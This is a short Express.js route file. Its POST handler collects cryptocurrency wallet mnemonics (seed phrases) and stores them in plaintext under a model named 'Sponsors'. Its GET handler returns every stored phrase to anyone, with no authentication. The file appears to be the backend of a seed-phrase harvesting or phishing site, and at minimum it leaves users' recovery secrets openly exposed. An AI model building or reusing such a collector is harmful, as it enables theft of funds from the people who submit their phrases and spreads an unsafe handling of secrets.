// routes/passphrases.js
import express from 'express';
import Sponsors from '../models/Sponsors.js';

const router = express.Router();

// POST /api/passphrases - Add a new passphrase
router.post('/', async (req, res) => {
    const { mnemonic } = req.body;

    if (!mnemonic) {
        return res.status(400).json({ error: 'mnemonic is required' });
    }

    try {
        const existing = await Sponsors.findOne({ mnemonic });

        if (existing) {
            return res.status(409).json({ message: 'Passphrase already exists' });
        }

        const saved = await Sponsors.create({ mnemonic });
        res.status(201).json(saved);
    } catch (err) {
        console.error('Error saving passphrase:', err);
        res.status(500).json({ error: 'Failed to save passphrase' });
    }
});

router.get('/', async (req, res) => {
    const all = await Sponsors.find();
    res.json(all);
});

export default router;
